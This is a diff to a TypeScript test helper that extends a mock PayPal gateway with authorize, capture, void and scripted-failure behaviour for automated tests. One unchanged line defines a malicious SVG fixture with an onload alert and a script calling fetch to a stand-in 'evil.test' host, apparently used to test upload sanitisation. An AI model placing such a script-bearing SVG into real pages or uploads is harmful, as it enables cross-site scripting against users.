@@ -1,6 +1,6 @@
 import { randomUUID } from "node:crypto";
 import { prisma } from "@/lib/db";
-import { PayPalApiError, type CreateOrderInput, type PayPalCapture, type PayPalGateway, type PayPalOrder } from "@/lib/paypal/gateway";
+import { PayPalApiError, type CaptureAuthorizationInput, type CreateOrderInput, type PayPalAuthorization, type PayPalCapture, type PayPalGateway, type PayPalOrder } from "@/lib/paypal/gateway";
 import type { BriefContent } from "@/lib/brief";
 
 export const db = prisma;
@@ -47,6 +47,8 @@ export const SVG_BYTES = new TextEncoder().encode(`<?xml version="1.0"?><svg xml
 export const EVIL_SVG_BYTES = new TextEncoder().encode(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch('https://evil.test')</script></svg>`);
 
 type Behavior = "COMPLETED" | "PENDING" | "DECLINED" | "INSTRUMENT_DECLINED" | "ALREADY_CAPTURED_AFTER" | "TAMPER_CAPTURE_AMOUNT";
+type AuthBehavior = "CREATED" | "PENDING" | "DENIED" | "TAMPER_AUTH_AMOUNT" | "ALREADY_AUTHORIZED_AFTER";
+type CaptureAuthBehavior = "COMPLETED" | "PENDING" | "EXPIRED";
 
 /**
  * MOCK PayPal used only by automated tests. It mimics documented Orders v2
@@ -61,7 +63,13 @@ export class ScriptedGateway implements PayPalGateway {
   captureRequests = new Map<string, PayPalOrder>();
   calls: string[] = [];
   behavior: Behavior = "COMPLETED";
+  authBehavior: AuthBehavior = "CREATED";
+  captureAuthBehavior: CaptureAuthBehavior = "COMPLETED";
   orderAmountOverride: { currency_code: string; value: string } | null = null;
+  authorizations = new Map<string, PayPalAuthorization>();
+  authorizeRequests = new Map<string, PayPalOrder>();
+  captureAuthRequests = new Map<string, PayPalCapture>();
+  holdCaptures = new Map<string, PayPalCapture>();
   private n = 0;
 
   async createOrder(input: CreateOrderInput) {
@@ -69,7 +77,7 @@ export class ScriptedGateway implements PayPalGateway {
     const prior = this.createRequests.get(input.requestId);
     if (prior) return structuredClone(this.orders.get(prior)!);
     const id = `TESTORDER${randomUUID().slice(0, 8).toUpperCase()}${++this.n}`;
-    const order: PayPalOrder = { id, status: "CREATED", purchase_units: [{ reference_id: input.referenceId, custom_id: input.customId, invoice_id: input.invoiceId, amount: this.orderAmountOverride ?? { currency_code: input.currency, value: input.amountValue } }] };
+    const order: PayPalOrder = { id, status: "CREATED", intent: input.intent ?? "CAPTURE", purchase_units: [{ reference_id: input.referenceId, custom_id: input.customId, invoice_id: input.invoiceId, amount: this.orderAmountOverride ?? { currency_code: input.currency, value: input.amountValue } }] };
     this.orders.set(id, order);
     this.createRequests.set(input.requestId, id);
     return structuredClone(order);
@@ -111,6 +119,8 @@ export class ScriptedGateway implements PayPalGateway {
     return structuredClone(o);
   }
   async getCapture(captureId: string) {
+    const held = this.holdCaptures.get(captureId);
+    if (held) return structuredClone(held);
     for (const o of this.orders.values()) {
       const c = o.purchase_units?.[0]?.payments?.captures?.find((x) => x.id === captureId);
       if (c) return structuredClone(c);
@@ -119,5 +129,71 @@ export class ScriptedGateway implements PayPalGateway {
   }
   captureCalls() {
     return this.calls.filter((c) => c.startsWith("capture:"));
+  }
+
+  // ----- authorize-then-capture (holds) -----
+  async authorizeOrder(orderId: string, requestId: string) {
+    this.calls.push(`authorize:${orderId}:${requestId}`);
+    const prior = this.authorizeRequests.get(requestId);
+    if (prior) return structuredClone(prior);
+    const o = this.orders.get(orderId)!;
+    if (o.status === "COMPLETED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["ORDER_ALREADY_AUTHORIZED"], "dbg", "already authorized");
+    if (o.status !== "APPROVED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["ORDER_NOT_APPROVED"], "dbg", "not approved");
+    if (this.behavior === "INSTRUMENT_DECLINED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["INSTRUMENT_DECLINED"], "dbg", "declined");
+    const pu = o.purchase_units![0]!;
+    const status = this.authBehavior === "PENDING" ? "PENDING" : this.authBehavior === "DENIED" ? "DENIED" : "CREATED";
+    const amount = this.authBehavior === "TAMPER_AUTH_AMOUNT" ? { currency_code: pu.amount!.currency_code, value: "1.00" } : pu.amount;
+    const auth: PayPalAuthorization = {
+      id: `TESTAUTH${randomUUID().slice(0, 8).toUpperCase()}${++this.n}`, status, amount, custom_id: pu.custom_id, invoice_id: pu.invoice_id,
+      status_details: status === "PENDING" ? { reason: "PENDING_REVIEW" } : undefined,
+      expiration_time: new Date(Date.now() + 29 * 86_400_000).toISOString(), supplementary_data: { related_ids: { order_id: orderId } },
+    };
+    pu.payments = { authorizations: [auth] };
+    o.status = "COMPLETED";
+    o.payer = { payer_id: "TESTPAYER123" };
+    this.authorizations.set(auth.id, auth);
+    if (this.authBehavior === "ALREADY_AUTHORIZED_AFTER") throw new PayPalApiError(500, "INTERNAL_SERVER_ERROR", [], "dbg", "timeout after authorizing");
+    this.authorizeRequests.set(requestId, structuredClone(o));
+    return structuredClone(o);
+  }
+  async getAuthorization(authorizationId: string) {
+    this.calls.push(`getauth:${authorizationId}`);
+    const a = this.authorizations.get(authorizationId);
+    if (!a) throw new PayPalApiError(404, "RESOURCE_NOT_FOUND", ["INVALID_RESOURCE_ID"], "dbg", "no authorization");
+    return structuredClone(a);
+  }
+  async captureAuthorization(authorizationId: string, input: CaptureAuthorizationInput) {
+    this.calls.push(`capauth:${authorizationId}:${input.requestId}`);
+    const prior = this.captureAuthRequests.get(input.requestId);
+    if (prior) return structuredClone(prior);
+    const a = this.authorizations.get(authorizationId)!;
+    if (a.status === "VOIDED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["AUTHORIZATION_VOIDED"], "dbg", "voided");
+    if (a.status === "CAPTURED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["AUTHORIZATION_ALREADY_CAPTURED"], "dbg", "already captured");
+    if (this.captureAuthBehavior === "EXPIRED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["AUTHORIZATION_EXPIRED"], "dbg", "expired");
+    const amount = { currency_code: input.currency, value: input.amountValue };
+    const status = this.captureAuthBehavior === "PENDING" ? "PENDING" : "COMPLETED";
+    const capture: PayPalCapture = {
+      id: `TESTHOLDCAP${randomUUID().slice(0, 8).toUpperCase()}${++this.n}`, status, amount, final_capture: input.finalCapture,
+      status_details: status === "PENDING" ? { reason: "PENDING_REVIEW" } : undefined,
+      seller_receivable_breakdown: { gross_amount: amount, paypal_fee: { currency_code: "USD", value: "10.77" }, net_amount: { currency_code: "USD", value: "289.23" } },
+      supplementary_data: { related_ids: { order_id: a.supplementary_data?.related_ids?.order_id } },
+    };
+    a.status = "CAPTURED";
+    this.holdCaptures.set(capture.id, capture);
+    this.captureAuthRequests.set(input.requestId, structuredClone(capture));
+    return structuredClone(capture);
+  }
+  async voidAuthorization(authorizationId: string, requestId: string) {
+    this.calls.push(`void:${authorizationId}:${requestId}`);
+    const a = this.authorizations.get(authorizationId)!;
+    if (a.status === "CAPTURED") throw new PayPalApiError(422, "UNPROCESSABLE_ENTITY", ["AUTHORIZATION_ALREADY_CAPTURED"], "dbg", "already captured");
+    a.status = "VOIDED";
+    return structuredClone(a);
+  }
+  holdCaptureCalls() {
+    return this.calls.filter((c) => c.startsWith("capauth:"));
+  }
+  authorizeCalls() {
+    return this.calls.filter((c) => c.startsWith("authorize:"));
   }
 }
